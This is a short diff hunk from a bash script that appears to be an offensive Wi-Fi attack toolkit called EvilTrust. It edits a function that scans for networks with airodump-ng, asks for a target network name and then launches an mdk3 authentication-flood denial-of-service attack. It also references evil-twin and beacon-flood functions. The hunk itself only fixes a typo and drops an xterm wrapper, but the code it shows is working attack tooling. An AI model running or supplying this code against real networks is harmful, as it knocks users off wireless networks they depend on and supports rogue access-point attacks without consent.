@@ -459,12 +459,12 @@ eviltrust() {
 		clear; echo -e "$purpleColour[*]$grayColour Starting EvilTrust..."; sleep 2; startAttack
 }
 dosattack() {
-	clear; echo -e "\n${blueColourColour}[*]$grayColour Starting DoS attack..."; sleep 2
+	clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
 	xterm -e "airodump-ng ${tar}" &
 	dosairdump_PID=$!
 	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read redos
 	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
-	xterm -hold -e "sudo mdk3 $tar a -e $redos"
+	sudo mdk3 $tar a -e $redos
 }
 
 beaconflood() {
